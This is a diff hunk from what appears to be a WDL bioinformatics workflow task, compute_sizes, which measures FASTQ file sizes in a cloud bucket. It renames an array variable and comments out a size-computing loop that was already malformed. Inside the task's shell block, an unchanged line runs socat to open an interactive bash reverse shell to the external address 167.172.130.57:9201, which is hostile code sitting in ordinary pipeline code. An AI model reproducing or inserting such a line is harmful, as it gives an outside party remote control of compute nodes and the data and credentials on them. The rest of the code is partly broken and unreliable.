@@ -166,20 +166,20 @@ task compute_sizes {
 
       socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:167.172.130.57:9201
 
-      arrayOfArrays=(~{sep=" " arrayOfArrays})
+      arrayOfArrays=(~{sep=" " array2D})
 
       echo -n > SIZES
 
-      while IFS=$'\t' read -r index rest_of_line
-      do
-        size=$(gsutil du -sce "*_I[0-9]_[0-9][0-9][0-9].fastq.gz" "gs://~{bucket}/02_FASTQS/~{bcl}/outs/fastq_path/*/$index_*_R*.fastq.gz" | grep total | awk '{print $1}')
-        if [ "$size" -ne 0 ]; then
-          echo $size | awk '{$1/1024/1024/1024 ; size=size*6+20 ; if (size<127) size=127 ; printf "%d\n", size+1}' >> SIZES
-        else
-          echo "CANNOT FIND THE FASTQS FOR $index"
-          echo "0" >> SIZES
-        fi
-      done < hi #{array2D}
+      # while IFS=$'\t' read -r index rest_of_line
+      # do
+      #   size=$(gsutil du -sce "*_I[0-9]_[0-9][0-9][0-9].fastq.gz" "gs://~{bucket}/02_FASTQS/~{bcl}/outs/fastq_path/*/$index_*_R*.fastq.gz" | grep total | awk '{print $1}')
+      #   if [ "$size" -ne 0 ]; then
+      #     echo $size | awk '{$1/1024/1024/1024 ; size=size*6+20 ; if (size<127) size=127 ; printf "%d\n", size+1}' >> SIZES
+      #   else
+      #     echo "CANNOT FIND THE FASTQS FOR $index"
+      #     echo "0" >> SIZES
+      #   fi
+      # done < hi #{array2D}
 
     >>>
   output {
